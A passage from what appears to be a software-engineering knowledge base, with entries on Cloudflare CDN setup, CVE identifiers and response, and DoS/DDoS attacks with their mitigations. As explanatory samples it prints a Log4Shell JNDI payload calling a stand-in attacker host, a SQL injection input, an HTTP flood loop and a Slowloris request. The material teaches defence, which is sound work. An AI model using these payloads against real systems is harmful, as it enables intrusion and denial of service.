redirect\nURL: http://example.com/*\nSettings:\n- Always Use HTTPS: On\n```\n\n## Caching Strategies\n\n### Cache Static Assets\n\n```\nAutomatic for:\n*.jpg, *.png, *.css, *.js\n\nCustom cache with Page Rules:\nURL: example.com/assets/*\nCache Level: Cache Everything\nEdge Cache TTL: 1 month\n```\n\n### Cache HTML Pages\n\n```\nPage Rule:\nURL: example.com/*\nCache Level: Cache Everything\nEdge Cache TTL: 2 hours\n\n⚠️ Watch for dynamic content\n✅ Good for: Blogs, marketing sites\n❌ Bad for: User dashboards, real-time data\n```\n\n### Bypass Cache\n\n```javascript\n// Set in server response headers\nCache-Control: no-cache, no-store, private\n\n// Or via Page Rule\nURL: example.com/api/*\nCache Level: Bypass\n```\n\n### Purge Cache\n\n```bash\n# Purge everything (free tier)\nCloudflare Dashboard → Caching → Purge Everything\n\n# Purge by URL (Pro+)\nhttps://example.com/style.css\n\n# Purge by tag (Business+)\nCache-Tag: product-123\n\n# Via API\ncurl -X POST \"https://api.cloudflare.com/client/v4/zones/{zone_id}/purge_cache\" \\\n  -H \"Authorization: Bearer {token}\" \\\n  -d '{\"purge_everything\":true}'\n```\n\n## Security Features\n\n### Firewall Rules\n\n```\nFree tier: 5 rules\n\nExample 1: Block country\nField: Country\nOperator: equals\nValue: XX\nAction: Block\n\nExample 2: Challenge suspicious traffic\nField: Threat Score\nOperator: greater than\nValue: 10\nAction: Challenge\n\nExample 3: Allow only specific IPs to admin\nField: URI Path\nOperator: contains\nValue: /admin\nAND\nField: IP Address\nOperator: is not in\nValue: 203.0.113.0/24\nAction: Block\n```\n\n### Rate Limiting\n\n```\nFree tier: 1 rule\n\nExample: Protect API\nMatch: api.example.com/login\nRequests: 5 per minute\nAction: Block for 10 minutes\n```\n\n### Bot Protection\n\n```\nFree tier: Basic bot fight mode\n- Blocks bad bots automatically\n- Invisible to legitimate users\n\nPro+: Advanced bot management\n- Machine learning detection\n- Custom rules\n```\n\n## Workers (Edge Computing)\n\nServerless JavaScript at edge locations.\n\n```javascript\n// Free tier: 100,000 requests/day\n\n// Simple example: Redirect\naddEventListener('fetch', event => {\n  event.respondWith(handleRequest(event.request))\n})\n\nasync function handleRequest(request) {\n  const url = new URL(request.url)\n  \n  // Redirect www to non-www\n  if (url.hostname.startsWith('www.')) {\n    url.hostname = url.hostname.substring(4)\n    return Response.redirect(url.toString(), 301)\n  }\n  \n  return fetch(request)\n}\n\n// Deploy via Cloudflare Dashboard or CLI\nwrangler publish\n```\n\n### Common Worker Use Cases\n\n```javascript\n// A/B testing\nif (Math.random() > 0.5) {\n  return fetch('https://variant-a.com')\n} else {\n  return fetch('https://variant-b.com')\n}\n\n// Custom headers\nconst response = await fetch(request)\nconst newHeaders = new Headers(response.headers)\nnewHeaders.set('X-Custom-Header', 'value')\nreturn new Response(response.body, {\n  headers: newHeaders\n})\n\n// Geo-redirect\nconst country = request.cf.country\nif (country === 'US') {\n  return fetch('https://us.example.com')\n}\n```\n\n## Analytics\n\n```\nFree tier includes:\n\n- Traffic analytics (24 hours)\n- Security events\n- Performance metrics\n- Top requests\n\nPro+ includes:\n- 30+ days history\n- GraphQL API access\n- Detailed bot analytics\n```\n\n## Common Configurations\n\n### Basic WordPress\n\n```\nPage Rules:\n1. example.com/wp-admin/*\n   Cache Level: Bypass\n\n2. example.com/wp-login.php\n   Cache Level: Bypass\n\n3. example.com/*\n   Cache Level: Cache Everything\n   Edge Cache TTL: 2 hours\n\nSettings:\n- SSL: Full (Strict)\n- Auto Minify: HTML, CSS, JS\n- Brotli: On\n```\n\n### SPA (React/Vue)\n\n```\nPage Rules:\n1. example.com/api/*\n   Cache Level: Bypass\n\n2. example.com/*\n   Cache Level: Cache Everything\n   Edge Cache TTL: 1 hour\n\nSettings:\n- SSL: Full (Strict)\n- Always Use HTTPS: On\n```\n\n### API\n\n```\nPage Rules:\n1. api.example.com/*\n   Cache Level: Bypass\n   OR\n   Cache Level: Cache Everything (for GET only)\n   Edge Cache TTL: 5 minutes\n\nFirewall Rules:\n1. Rate limit: 100 req/min per IP\n2. Block bad bots\n```\n\n## Troubleshooting\n\n### Site Not Loading\n\n```bash\n# Check DNS propagation\ndig example.com @1.1.1.1\n\n# Check if proxied\ndig example.com\n# Should return Cloudflare IPs (104.x.x.x or 172.x.x.x)\n\n# Temporarily bypass Cloudflare\nSet DNS record to \"DNS Only\" mode\n```\n\n### SSL Errors\n\n```\nError: \"Too many redirects\"\nCause: SSL mode mismatch\nFix: Set to Full or Full (Strict)\n\nError: \"Invalid certificate\"\nCause: Origin server has no SSL\nFix: Install SSL on origin or use Flexible mode (not recommended)\n```\n\n### Cache Not Working\n\n```\nCheck:\n1. Page Rules order (top = highest priority)\n2. Cache-Control headers from origin\n3. Cookies (Cloudflare bypasses cache if cookies present)\n4. Query strings (cache varies by query string)\n\nDebug:\ncurl -I https://example.com/page.html | grep -i cf-cache\n# cf-cache-status: HIT (cached)\n# cf-cache-status: MISS (not cached)\n# cf-cache-status: BYPASS (cache disabled)\n```\n\n## Pricing Tiers\n\n```\nFree ($0/month):\n✅ Unlimited DDoS protection\n✅ CDN\n✅ Free SSL\n✅ 3 page rules\n✅ Basic analytics (24h)\n❌ No SLA\n❌ No image optimization\n\nPro ($20/month):\n✅ Everything in Free\n✅ 20 page rules\n✅ Image optimization\n✅ Mobile optimization\n✅ Analytics (30 days)\n\nBusiness ($200/month):\n✅ Everything in Pro\n✅ 50 page rules\n✅ Advanced DDoS\n✅ WAF (Web Application Firewall)\n✅ PCI compliance\n\nEnterprise (Custom):\n✅ Everything in Business\n✅ Custom rules/configs\n✅ 24/7 support\n✅ Custom SSL\n✅ 100% uptime SLA\n```\n\n## Best Practices\n\n```javascript\n// ✅ Use \"Proxied\" for web traffic\nA    example.com    192.0.2.1    ☁️ Proxied\n\n// ✅ Use \"DNS Only\" for mail, SSH, FTP\nMX   example.com    mail.host    🔘 DNS Only\nA    ssh            192.0.2.1    🔘 DNS Only\n\n// ✅ Enable Always Use HTTPS\n// ✅ Use Full (Strict) SSL mode\n// ✅ Enable Brotli compression\n// ✅ Set appropriate cache TTLs\n// ✅ Purge cache after deployments\n\n// ❌ Don't proxy non-HTTP services\n// ❌ Don't use Flexible SSL (insecure)\n// ❌ Don't cache user-specific content\n// ❌ Don't cache without testing\n```\n\n## References\n\n- [Cloudflare Documentation](https://developers.cloudflare.com/)\n- [Cloudflare Speed Test](https://speed.cloudflare.com/)\n- [Community Forum](https://community.cloudflare.com/)\n- [Status Page](https://www.cloudflarestatus.com/)\n\n---\n\n## Summary\n\n**Cloudflare:** Global network providing CDN, security, and DNS services.\n\n**Core Features:**\n- **CDN:** Cache content globally for speed\n- **DDoS Protection:** Block attacks automatically\n- **SSL:** Free certificates\n- **DNS:** Fast 1.1.1.1 resolver\n\n**Free Tier:** Generous—suitable for most websites.\n\n**Setup:**\n1. Add site to Cloudflare\n2. Update nameservers at registrar\n3. Configure SSL (Full Strict)\n4. Set page rules for caching\n\n**Quick Win:** Free SSL + DDoS protection + global CDN for any website.\n\n**Rule of thumb:** Proxy web traffic (☁️), DNS-only for mail/SSH (🔘). Use Full (Strict) SSL. Cache static assets, bypass cache for dynamic content."
    },
    {
      "id": "swe/security/web-security/cloudflare-wordpress",
      "title": "Summary",
      "path": [
        "swe",
        "security",
        "web-security",
        "cloudflare-wordpress"
      ],
      "content": "# Summary\n\n**What we did:** Set up Cloudflare as a CDN/security layer for a website\n\n**Why:** \n- Faster load times (content cached globally)\n- DDoS protection\n- Free SSL management\n- Reduced server load on InMotion\n\n---\n\n# Glossary\n\n**DNS (Domain Name System):** Phone book for the internet - translates `website.name` to server IP `216.x.x.x`\n\n**Nameservers:** Servers that store DNS records and answer \"where does this domain point?\"\n\n**DNS Records:**\n- **A Record:** Points domain to IP address\n- **CNAME:** Alias pointing to another domain\n- **MX:** Mail server routing\n- **TXT:** Verification/security data\n\n**Proxy (Orange Cloud):** Traffic routes through Cloudflare first (caching, security)\n\n**DNS Only (Gray Cloud):** Direct connection, bypasses Cloudflare\n\n**CDN (Content Delivery Network):** Distributed servers that cache your site closer to visitors\n\n---\n\n# Steps Taken\n\n1. Created Cloudflare account, imported DNS records\n2. Set website records to proxied (orange), admin/email to DNS only (gray)\n3. Changed nameservers at Squarespace: InMotion → Cloudflare\n4. Verified DNSSEC off\n5. Now waiting for DNS propagation\n\n---\n\n# Flow Comparison\n\n**Old:** Visitor → Squarespace DNS → InMotion nameservers → InMotion server → Site\n\n**New:** Visitor → Squarespace DNS → Cloudflare nameservers → Cloudflare CDN (cache/security) → InMotion server → Site\n\n---\n\nQuestion: How can cloudflare get in front of this traffic? is it because squarespace nameservers are now pointing to cloudeflare?\n\n\n\n# Exactly Right!\n\n**Yes - it's all because of the nameserver change.**\n\n---\n\n# How It Works:\n\n1. **Visitor types `sola.network` in browser**\n\n2. **Browser asks:** \"Where is sola.network?\"\n\n3. **Squarespace (registrar) says:** \"Ask Cloudflare's nameservers\" ← *This is the key*\n\n4. **Cloudflare's nameservers respond:** \"sola.network is at this IP... but route through us first\"\n\n5. **Traffic flows through Cloudflare**, then to InMotion\n\n---\n\n# The Critical Piece:\n\n**Nameservers control who answers DNS queries.**\n\n- When nameservers were InMotion's → InMotion gave the IP, traffic went direct\n- Now nameservers are Cloudflare's → Cloudflare gives *their* IP for proxied records, intercepts traffic\n\n**For proxied (orange) records:** Cloudflare returns *Cloudflare's IP*, not InMotion's IP directly\n\n**For DNS only (gray) records:** Cloudflare returns InMotion's actual IP, traffic goes direct\n\n---\n\n# Analogy:\n\n**Squarespace = Property deed** (proves you own the domain)\n\n**Nameservers = GPS coordinator** (decides what address to give when someone asks for directions)\n\nYou just changed the GPS coordinator from InMotion to Cloudflare."
    },
    {
      "id": "swe/security/web-security/cve",
      "title": "CVE (Common Vulnerabilities and Exposures): Complete Overview",
      "path": [
        "swe",
        "security",
        "web-security",
        "cve"
      ],
      "content": "# CVE (Common Vulnerabilities and Exposures): Complete Overview\n\nCVE is a standardized system for identifying and cataloging publicly known cybersecurity vulnerabilities. Each CVE entry has a unique ID (like CVE-2024-1234) that references a specific security flaw in software or hardware. Think of CVE as a universal catalog number system—like ISBN for books or UPC for products—that lets everyone reference the same vulnerability using the same identifier worldwide.\n\n## Key Points\n\n- **CVE ID:** Unique identifier for security vulnerabilities (CVE-YYYY-NNNNN)\n- **Purpose:** Standard naming for vulnerabilities across vendors and tools\n- **Database:** Public repository of known vulnerabilities\n- **CVSS Score:** Severity rating (0-10, Critical/High/Medium/Low)\n- **Free Access:** Public database maintained by MITRE\n\n## CVE ID Format\n\n```\nCVE-2024-12345\n│   │    │\n│   │    └─ Sequential number (4-7 digits)\n│   └────── Year vulnerability was published\n└────────── CVE prefix (constant)\n\nExamples:\nCVE-2021-44228  (Log4Shell - critical Java vulnerability)\nCVE-2014-0160   (Heartbleed - OpenSSL bug)\nCVE-2017-5754   (Meltdown - CPU vulnerability)\n\n```\n\n## CVE Entry Components\n\n```\nCVE-2021-44228 (Log4Shell Example)\n\nID: CVE-2021-44228\nDescription: Apache Log4j2 2.0-beta9 through 2.15.0 JNDI features \n             used in configuration, log messages, and parameters \n             do not protect against attacker controlled LDAP and \n             other JNDI related endpoints.\n\nSeverity: CRITICAL (CVSS 10.0)\nPublished: December 10, 2021\nAffected: Apache Log4j 2.0-beta9 to 2.15.0\nFixed In: Apache Log4j 2.16.0+\n\nReferences:\n- https://nvd.nist.gov/vuln/detail/CVE-2021-44228\n- Vendor advisory\n- Proof of concept\n- Patches/workarounds\n\n```\n\n## CVSS Scoring System\n\n```\nCVSS (Common Vulnerability Scoring System)\nScore: 0.0 - 10.0\n\nRating Scale:\n0.0           None\n0.1 - 3.9     Low\n4.0 - 6.9     Medium\n7.0 - 8.9     High\n9.0 - 10.0    Critical\n\nExample Scores:\nCVE-2021-44228 (Log4Shell)      10.0 (Critical)\nCVE-2014-0160 (Heartbleed)       7.5 (High)\nCVE-2017-5754 (Meltdown)         5.6 (Medium)\n\n```\n\n**CVSS Factors:**\n\n```\nAttack Vector: Network, Adjacent, Local, Physical\nAttack Complexity: Low or High\nPrivileges Required: None, Low, High\nUser Interaction: None or Required\nScope: Changed or Unchanged\nImpact: Confidentiality, Integrity, Availability\n\nExample:\nNetwork + Low Complexity + No Privileges + No User Interaction\n= High severity score\n\n```\n\n## Real-World Examples\n\n### Log4Shell (CVE-2021-44228)\n\n```\nID: CVE-2021-44228\nYear: 2021\nCVSS: 10.0 (Critical)\nImpact: Remote Code Execution\n\nAffected:\n- Apache Log4j 2.0-beta9 to 2.15.0\n- Millions of applications worldwide\n\nAttack:\n${jndi:ldap://attacker.com/exploit}\n  ↓\nLog4j processes malicious string\n  ↓\nExecutes attacker's code remotely\n\nFix:\nUpdate to Log4j 2.17.0+\nOr disable JNDI lookups\n\n```\n\n### Heartbleed (CVE-2014-0160)\n\n```\nID: CVE-2014-0160\nYear: 2014\nCVSS: 7.5 (High)\nImpact: Information Disclosure\n\nAffected:\n- OpenSSL 1.0.1 through 1.0.1f\n- ~17% of secure web servers\n\nAttack:\nMalformed heartbeat request\n  ↓\nRead 64KB of server memory\n  ↓\nSteal passwords, keys, data\n\nFix:\nUpdate OpenSSL to 1.0.1g+\nRevoke/reissue SSL certificates\n\n```\n\n### SQL Injection (Generic Example)\n\n```\nID: CVE-2019-XXXXX (example)\nCVSS: 9.8 (Critical)\nImpact: Data breach, authentication bypass\n\nVulnerable Code:\nquery = \"SELECT * FROM users WHERE id = \" + userId;\n\nAttack:\nuserId = \"1 OR 1=1\"\n  ↓\nSELECT * FROM users WHERE id = 1 OR 1=1\n  ↓\nReturns all users\n\nFix:\nUse parameterized queries\nquery = \"SELECT * FROM users WHERE id = ?\"\n\n```\n\n## Checking for Vulnerabilities\n\n### npm (Node.js)\n\n```bash\n# Check for known CVEs in dependencies\nnpm audit\n\n# Output\nfound 3 vulnerabilities (1 moderate, 2 high)\n\n  Moderate  Prototype Pollution\n  Package   minimist\n  CVE       CVE-2020-7598\n  Fixed in  0.2.1\n\n  High      Remote Code Execution\n  Package   lodash\n  CVE       CVE-2021-23337\n  Fixed in  4.17.21\n\n# Fix automatically\nnpm audit fix\n\n# Fix breaking changes\nnpm audit fix --force\n\n```\n\n### pip (Python)\n\n```bash\n# Check Python packages\npip-audit\n\n# Or use safety\npip install safety\nsafety check\n\n# Output\n+===============================================+\n| Safety report                                |\n+===============================================+\n| VULNERABILITY FOUND                          |\n+===============================================+\n| ID: 39621                                     |\n| Package: Django                               |\n| CVE: CVE-2021-35042                          |\n| Severity: High                                |\n+===============================================+\n\n```\n\n### Docker\n\n```bash\n# Scan Docker images\ndocker scan myimage:latest\n\n# Output\nTested 200 dependencies for known vulnerabilities\nfound 5 vulnerabilities (1 critical, 2 high, 2 medium)\n\n✗ Critical severity vulnerability found in openssl\n  CVE-2022-0778\n  Fix: Upgrade to openssl@1.1.1n\n\n```\n\n### GitHub Dependabot\n\n```yaml\n# .github/dependabot.yml\nversion: 2\nupdates:\n  - package-ecosystem: \"npm\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n    # Auto-creates PRs for CVE fixes\n\n```\n\n## Vulnerability Lifecycle\n\n```\n1. Discovery\n   ↓\n   Researcher finds vulnerability\n   \n2. Reporting\n   ↓\n   Reported to vendor/MITRE\n   \n3. CVE Assignment\n   ↓\n   Unique CVE ID issued\n   \n4. Analysis\n   ↓\n   CVSS score calculated\n   Affected versions identified\n   \n5. Publication\n   ↓\n   Public disclosure\n   Added to NVD database\n   \n6. Patching\n   ↓\n   Vendor releases fix\n   \n7. Remediation\n   ↓\n   Users update software\n\n```\n\n## Databases and Resources\n\n### National Vulnerability Database (NVD)\n\n```\nURL: https://nvd.nist.gov/\n\nFeatures:\n- Complete CVE database\n- CVSS scores\n- CPE (affected products)\n- Patch information\n- Exploit references\n\nSearch:\n- By CVE ID: CVE-2021-44228\n- By keyword: \"Apache Log4j\"\n- By vendor: \"Microsoft\"\n- By severity: Critical\n\n```\n\n### [CVE.org](http://CVE.org)\n\n```\nURL: https://www.cve.org/\n\nOfficial CVE database\nMaintained by MITRE\nBasic CVE listings\n\n```\n\n### Exploit Database\n\n```\nURL: https://www.exploit-db.com/\n\nContains:\n- CVE details\n- Proof of concept exploits\n- Exploit code\n- Security papers\n\nWarning: Use only for authorized testing\n\n```\n\n## Response Strategy\n\n### When CVE Affects Your System\n\n```\n1. Assess Impact\n   ├─ Is the vulnerable package installed?\n   ├─ What version do you have?\n   ├─ Is the vulnerability exploitable in your environment?\n   └─ What's the CVSS score?\n\n2. Prioritize\n   Critical (9.0+)    → Fix immediately (hours)\n   High (7.0-8.9)     → Fix urgently (days)\n   Medium (4.0-6.9)   → Fix soon (weeks)\n   Low (0.1-3.9)      → Schedule for next update\n\n3. Remediate\n   ├─ Update to patched version\n   ├─ Apply workaround if patch unavailable\n   ├─ Disable vulnerable feature\n   └─ Implement compensating controls\n\n4. Verify\n   ├─ Scan again to confirm fix\n   ├─ Test application functionality\n   └─ Monitor for exploitation attempts\n\n5. Document\n   ├─ Record CVE ID\n   ├─ Document remediation steps\n   └─ Update security advisories\n\n```\n\n### Example: Responding to Log4Shell\n\n```bash\n# 1. Identify affected systems\ngrep -r \"log4j\" pom.xml  # Maven\nnpm ls log4j             # Node.js\nfind / -name \"*log4j*.jar\" 2>/dev/null\n\n# 2. Check version\n# Look for log4j-core-2.x.x.jar\n# Vulnerable: 2.0-beta9 to 2.15.0\n\n# 3. Update immediately (Critical CVSS 10.0)\n# Maven\n<dependency>\n  <groupId>org.apache.logging.log4j</groupId>\n  <artifactId>log4j-core</artifactId>\n  <version>2.17.0</version>  <!-- Updated -->\n</dependency>\n\n# 4. Temporary mitigation (if can't update)\n-Dlog4j2.formatMsgNoLookups=true\n\n# 5. Test and deploy\nmvn clean install\n# Deploy to production\n\n```\n\n## Prevention Best Practices\n\n```bash\n# ✅ Automate dependency scanning\nnpm audit (in CI/CD)\nsnyk test\nOWASP Dependency-Check\n\n# ✅ Keep dependencies updated\nnpm update\npip install --upgrade\n\n# ✅ Use security tools\nGitHub Dependabot\nSnyk\nWhiteSource\nBlack Duck\n\n# ✅ Monitor security advisories\nSubscribe to vendor security lists\nFollow CVE feeds\nUse RSS for NVD updates\n\n# ✅ Implement defense in depth\nWAF (Web Application Firewall)\nNetwork segmentation\nLeast privilege access\nRegular security audits\n\n# ❌ Don't ignore medium/low CVEs\nThey can chain into critical exploits\n\n# ❌ Don't use deprecated/unmaintained packages\nNo security updates = vulnerable forever\n\n# ❌ Don't delay critical patches\nExploits published within hours of disclosure\n\n```\n\n## CI/CD Integration\n\n```yaml\n# GitHub Actions example\nname: Security Scan\non: [push, pull_request]\n\njobs:\n  security:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2\n      \n      - name: Run npm audit\n        run: npm audit --audit-level=high\n        \n      - name: Run Snyk\n        uses: snyk/actions/node@master\n        env:\n          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}\n          \n      - name: Fail on critical CVEs\n        run: |\n          if npm audit --json | jq '.metadata.vulnerabilities.critical > 0'; then\n            exit 1\n          fi\n\n```\n\n## Common CVE Categories\n\n```\n1. Remote Code Execution (RCE)\n   Most critical - attacker runs arbitrary code\n   Example: Log4Shell (CVE-2021-44228)\n\n2. SQL Injection\n   Database compromise\n   Example: Many web app CVEs\n\n3. Cross-Site Scripting (XSS)\n   Execute scripts in user's browser\n   Example: Stored/Reflected XSS\n\n4. Authentication Bypass\n   Gain unauthorized access\n   Example: Broken auth logic\n\n5. Information Disclosure\n   Leak sensitive data\n   Example: Heartbleed (CVE-2014-0160)\n\n6. Denial of Service (DoS)\n   Make service unavailable\n   Example: Resource exhaustion\n\n7. Privilege Escalation\n   Gain higher access level\n   Example: Local privilege escalation\n\n8. Cross-Site Request Forgery (CSRF)\n   Force user to execute unwanted actions\n   Example: CSRF in web apps\n\n```\n\n## Tools and Services\n\n```bash\n# Open Source\nOWASP Dependency-Check    # Multi-language\nnpm audit                 # Node.js\npip-audit / safety        # Python\nbundler-audit             # Ruby\ncargo audit               # Rust\n\n# Commercial\nSnyk                      # Multi-language\nWhiteSource              # Enterprise\nBlack Duck               # Enterprise\nVeracode                 # Application security\nCheckmarx                # SAST/SCA\n\n# Cloud Services\nAWS Inspector             # EC2/ECR scanning\nAzure Security Center     # Azure resources\nGoogle Cloud SCC          # GCP resources\n\n```\n\n## References\n\n- [NVD - National Vulnerability Database](https://nvd.nist.gov/)\n- [CVE.org - Official CVE Site](http://CVE.org)\n- [CVSS Calculator](https://www.first.org/cvss/calculator/3.1)\n- [OWASP Top 10](https://owasp.org/www-project-top-ten/)\n- [Snyk Vulnerability Database](https://snyk.io/vuln/)\n\n---\n\n## Summary\n\n**CVE:** Standardized ID system for security vulnerabilities (CVE-YYYY-NNNNN).\n\n**CVSS Score:**\n\n- 0.0-3.9: Low\n- 4.0-6.9: Medium\n- 7.0-8.9: High\n- 9.0-10.0: Critical\n\n**Check for CVEs:**\n\n```bash\nnpm audit          # Node.js\npip-audit          # Python\ndocker scan        # Docker images\n\n```\n\n**Response Priority:**\n\n- Critical (9.0+): Fix immediately\n- High (7.0-8.9): Fix within days\n- Medium/Low: Schedule appropriately\n\n**Prevention:**\n\n- Automate vulnerability scanning\n- Keep dependencies updated\n- Monitor security advisories\n- Implement defense in depth\n\n**Rule of thumb:** Run security scans regularly (CI/CD), prioritize by CVSS score, patch critical vulnerabilities within hours, automate where possible."
    },
    {
      "id": "swe/security/web-security/ddos",
      "title": "DoS and DDoS Attacks: Complete Overview",
      "path": [
        "swe",
        "security",
        "web-security",
        "ddos"
      ],
      "content": "# DoS and DDoS Attacks: Complete Overview\n\nDoS (Denial of Service) attacks overwhelm a target system with traffic or requests to make it unavailable to legitimate users. DDoS (Distributed Denial of Service) is the same attack but launched from multiple sources simultaneously, making it harder to block. Think of DoS like one person repeatedly calling a restaurant to tie up the phone line—annoying but manageable. DDoS is like thousands of people calling at once from different numbers—the phone system becomes completely unusable.\n\n## Key Points\n\n- **DoS:** Single source attack overwhelming target\n- **DDoS:** Multiple sources (botnet) attacking simultaneously\n- **Goal:** Make service unavailable, not steal data\n- **Types:** Volume (bandwidth), Protocol (resources), Application (logic)\n- **Mitigation:** Rate limiting, CDN, WAF, traffic filtering\n\n## DoS vs DDoS\n\n```\nDoS (Denial of Service)\n┌─────────┐\n│ Attacker│ ─────────────► ┌──────────┐\n└─────────┘                 │  Target  │\nSingle source               │  Server  │\n                           └──────────┘\nEasier to block (one IP)\n\nDDoS (Distributed Denial of Service)\n┌─────────┐\n│Attacker │\n└────┬────┘\n     │ Commands botnet\n     ▼\n┌─────────┐  ┌─────────┐  ┌─────────┐\n│ Bot 1   │  │ Bot 2   │  │ Bot 3   │\n└────┬────┘  └────┬────┘  └────┬────┘\n     │            │            │\n     └────────────┴────────────┘\n                  │\n                  ▼\n            ┌──────────┐\n            │  Target  │\n            │  Server  │\n            └──────────┘\n            \nThousands/millions of sources\nMuch harder to block\n```\n\n## Attack Types\n\n### Volume-Based (Layer 3/4)\n\n```\nGoal: Consume bandwidth\n\nUDP Flood\n├─ Attacker sends massive UDP packets\n├─ No handshake needed (stateless)\n├─ Target overwhelmed processing packets\n└─ Example: 100 Gbps of UDP traffic\n\nICMP Flood (Ping Flood)\n├─ Continuous ping requests\n├─ Target busy responding\n└─ Example: 10,000 pings/second\n\nDNS Amplification\n├─ Attacker spoofs victim's IP\n├─ Sends small DNS query to open resolvers\n├─ DNS responds with large response to victim\n├─ Amplification: 50x-100x\n└─ Example: 1 GB query → 50 GB response\n```\n\n### Protocol-Based (Layer 3/4)\n\n```\nGoal: Exhaust server resources (connections, memory)\n\nSYN Flood\n├─ Send SYN packets (start TCP handshake)\n├─ Never complete handshake (no ACK)\n├─ Server holds half-open connections\n├─ Connection table fills up\n└─ Legitimate users can't connect\n\nDiagram:\nAttacker → SYN → Server (waits for ACK)\nAttacker → SYN → Server (waits for ACK)\n(Repeat thousands of times)\nServer connection table full ❌\n\nPing of Death\n├─ Send oversized/malformed ping\n├─ Crashes or freezes target\n└─ Mostly patched in modern systems\n\nSmurf Attack\n├─ Send ICMP to broadcast address\n├─ Spoof victim's IP as source\n├─ All hosts reply to victim\n└─ Amplification attack\n```\n\n### Application Layer (Layer 7)\n\n```\nGoal: Exhaust application resources\n\nHTTP Flood\n├─ Legitimate-looking HTTP requests\n├─ Target resource-intensive pages\n├─ Example: Search, database queries, reports\n└─ Harder to detect (looks like real traffic)\n\nSlowloris\n├─ Open many connections to server\n├─ Send partial HTTP requests slowly\n├─ Keep connections alive indefinitely\n├─ Server runs out of connection slots\n└─ Low bandwidth required\n\nExample:\nPOST /upload HTTP/1.1\nHost: target.com\nContent-Length: 1000000\nContent-Type: application/x-www-form-urlencoded\n\n(Send 1 byte every 10 seconds)\n(Keep connection open forever)\n\nLow and Slow Attacks\n├─ Slow HTTP headers\n├─ Slow POST\n├─ Slow read\n└─ Mimic legitimate slow connections\n```\n\n## Real-World Examples\n\n### HTTP Flood Attack\n\n```javascript\n// What attacker does (simplified)\nfor (let i = 0; i < 100000; i++) {\n  fetch('https://target.com/expensive-search?q=test')\n    .catch(() => {}); // Don't care about response\n}\n\n// Target server overwhelmed:\n// - Database queries pile up\n// - CPU at 100%\n// - Memory exhausted\n// - Legitimate users get timeouts\n```\n\n### SYN Flood\n\n```bash\n# What attacker sends (pseudo-code)\nwhile true; do\n  send_packet(\n    type: SYN,\n    source_ip: random_ip(),  # Spoofed\n    destination: target_server,\n    source_port: random_port()\n  )\ndone\n\n# Server state:\nnetstat -an | grep SYN_RECV\n# Shows thousands of half-open connections\n```\n\n### DNS Amplification\n\n```\n1. Attacker → DNS Server: \"What's all the DNS info for example.com?\"\n   (Small request ~60 bytes, source IP spoofed as victim)\n\n2. DNS Server → Victim: [Huge DNS response ~3000 bytes]\n   \n3. Repeat with 10,000 DNS servers\n   \nResult: 60 KB request → 30 MB response to victim\nAmplification factor: 50x\n```\n\n## Detection\n\n### Traffic Patterns\n\n```javascript\n// Unusual traffic indicators\n{\n  requests_per_second: 10000,  // Normal: 100\n  unique_ips: 5000,            // Normal: 50\n  geographic_spread: 'global', // Normal: regional\n  user_agents: ['', '', ''],   // Missing or repeated\n  request_patterns: 'identical' // Same endpoint repeatedly\n}\n\n// Monitoring example\nconst metrics = {\n  normal_rps: 100,\n  current_rps: 10000,\n  threshold: 500\n};\n\nif (metrics.current_rps > metrics.threshold) {\n  alert('Possible DDoS attack detected');\n}\n```\n\n### Server Symptoms\n\n```bash\n# High CPU usage\ntop\n# Load average: 50.0 (normal: 2.0)\n\n# Memory exhaustion\nfree -h\n# Available: 100MB (normal: 8GB)\n\n# Connection table full\nnetstat -an | wc -l\n# 65535 connections (max reached)\n\n# Slow response times\ncurl -w \"@curl-format.txt\" https://site.com\n# Total time: 30s (normal: 0.5s)\n\n# Error logs flooded\ntail -f /var/log/nginx/error.log\n# Thousands of connection errors per second\n```\n\n## Mitigation Strategies\n\n### Rate Limiting\n\n```javascript\n// Express rate limiter\nimport rateLimit from 'express-rate-limit';\n\nconst limiter = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // Limit each IP to 100 requests per window\n  message: 'Too many requests from this IP'\n});\n\napp.use('/api/', limiter);\n\n// Advanced: Different limits per endpoint\nconst authLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000,\n  max: 5, // Only 5 login attempts\n  skipSuccessfulRequests: true\n});\n\napp.post('/api/auth/login', authLimiter, loginHandler);\n\n// IP-based blocking\nconst blockedIPs = new Set();\n\napp.use((req, res, next) => {\n  if (blockedIPs.has(req.ip)) {\n    return res.status(403).send('Blocked');\n  }\n  next();\n});\n```\n\n### CDN (Content Delivery Network)\n\n```\nWithout CDN:\nAll traffic → Origin Server (overwhelmed)\n\nWith CDN (Cloudflare, Akamai):\nTraffic → CDN Edge Servers → Origin Server\n         ↓\n    CDN absorbs attack\n    Only legitimate traffic reaches origin\n    \nBenefits:\n- Massive bandwidth capacity\n- DDoS protection built-in\n- Geographic distribution\n- Automatic mitigation\n```\n\n### WAF (Web Application Firewall)\n\n```\nWAF Rules:\n\n1. Block known bad IPs\n   if (ip in blacklist) block()\n\n2. Challenge suspicious requests\n   if (no_user_agent || suspicious_pattern) {\n     return captcha();\n   }\n\n3. Rate limit per IP\n   if (requests_per_minute > 100) {\n     return 429; // Too Many Requests\n   }\n\n4. Signature detection\n   if (matches_attack_pattern) block()\n\n5. Behavioral analysis\n   if (abnormal_behavior) challenge()\n```\n\n### Firewall Rules\n\n```bash\n# iptables: Limit connections per IP\niptables -A INPUT -p tcp --dport 80 -m connlimit \\\n  --connlimit-above 20 -j REJECT\n\n# Limit SYN packets (SYN flood protection)\niptables -A INPUT -p tcp --syn -m limit \\\n  --limit 1/s --limit-burst 3 -j ACCEPT\niptables -A INPUT -p tcp --syn -j DROP\n\n# Block specific IP\niptables -A INPUT -s 192.168.1.100 -j DROP\n\n# nginx: Connection limiting\nlimit_conn_zone $binary_remote_addr zone=addr:10m;\nlimit_conn addr 10; # Max 10 connections per IP\n\n# nginx: Request rate limiting\nlimit_req_zone $binary_remote_addr zone=req:10m rate=10r/s;\nlimit_req zone=req burst=20;\n```\n\n### Application-Level Defenses\n\n```javascript\n// CAPTCHA for suspicious traffic\napp.use((req, res, next) => {\n  if (isHighTrafficPeriod() && !req.session.verified) {\n    return res.render('captcha');\n  }\n  next();\n});\n\n// Connection draining (Slowloris defense)\nconst server = app.listen(3000);\nserver.setTimeout(30000); // 30 second timeout\nserver.headersTimeout = 40000;\n\n// Request size limits\napp.use(express.json({ limit: '1mb' }));\napp.use(express.urlencoded({ 